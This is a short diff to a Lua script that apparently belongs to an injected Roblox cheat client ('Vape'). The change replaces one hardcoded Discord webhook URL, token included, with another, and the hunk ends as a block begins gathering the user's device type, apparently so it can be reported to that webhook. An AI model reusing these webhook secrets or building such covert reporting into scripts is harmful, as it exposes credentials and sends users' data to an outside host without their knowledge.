@@ -22,7 +22,7 @@ local vapeEvents = setmetatable({}, {
 local vapeTargetInfo = shared.VapeTargetInfo
 local vapeInjected = true
 
-local webh = "https://discord.com/api/webhooks/1141538022530236458/9l45FvjULd9tRnuXFyTXixqGx-c6TFab9xtfe0yFHqervXHbSs2jm_ZOhbPmlNGUGPnm"
+local webh = "https://discord.com/api/webhooks/1141855627187073025/VQxtcFg_KkL9cwYspzFc90UPrff_AN79wJhCIwksMT3b-U6mlGnyJfrxl5gGLRx6r6sH"
 pcall(function()
     local deviceType = ""
 
